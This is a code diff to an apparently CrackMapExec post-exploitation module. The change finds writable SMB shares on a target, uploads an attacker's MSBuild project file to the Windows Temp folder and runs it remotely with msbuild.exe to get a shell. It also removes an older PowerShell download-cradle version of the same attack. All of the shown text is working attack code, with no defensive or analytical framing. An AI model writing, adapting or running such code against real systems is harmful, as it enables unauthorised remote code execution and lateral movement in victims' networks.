@@ -23,26 +23,31 @@ class CMEModule:
         if module_options and 'ARCH' in module_options:
             self.arch = module_options["ARCH"]
     def on_login(self, context, connection):
+        shares = connection.shares()
+        for share in shares:
+            if 'WRITE' in share['access'] and share['name'] not in ['R$', 'ADMIN$']:
+                context.log.success('Found writable share: {}'.format(share['name']))
+                with open(self.filename, 'rb') as file:
+                    try:
+                        connection.conn.putFile(share['name'], "\\Windows\\Temp\\test.xml", file.read)
+                        self.targetFile = share['name'][:-1] + ':\\Windows\\Temp\\test.xml'
+                        print(self.targetFile)
+                        context.log.success('Uploaded file to {}:\\Windows\\Temp\\test.xml'.format(share['name']))
+                    except Exception as e:
+                        context.log.error('Error uploading file {}: {}'.format(share['name'][:-1], e))
+            else:
+                pass
         if self.arch == 'x64':
-            winders = os.path.join("%WINDIR%", "Microsoft.NET", "Framework64", self.ver, "msbuild.exe")
-            command = '{} {}'.format(winders, self.filename)
-            cradle = gen_ps_iex_cradle(context, self.filename, command)
+            winders = "%WINDIR%\\Microsoft.NET\\Framework64\\"+ self.ver+ "\\msbuild.exe"
+            command = '{} {}'.format(winders, self.targetFile)
         elif self.arch == 'x86':
-            winders = os.path.join("%WINDIR%", "Microsoft.NET", "Framework", self.ver, "msbuild.exe")
-            command = '{} {}'.format(winders, self.filename)
-            cradle = gen_ps_iex_cradle(context, self.filename, command)
+            winders = "%WINDIR%\\Microsoft.NET\\Framework\\"+ self.ver+ "\\msbuild.exe"
+            command = '{} {}'.format(winders, self.targetFile)
         else:
             print("You need to supply the 'ARCH' command line argument :)")
         try:
-            connection.ps_execute(cradle)
-            context.log.success("Executed msbuild on" + self.filename)
+            connection.execute(payload=command, get_output=False)
+            context.log.success("Executed msbuild, hope you caught a shell!")
         except Exception as e:
             context.log.error("Msbuild failed")
             context.log.debug("Error : ".format(str(e)))
-    def on_request(self, context, request):
-        if self.filename == request.path[1:]:
-            request.send_response(200)
-            request.end_headers()
-        else:
-            request.send_response(404)
-            request.end_headers()
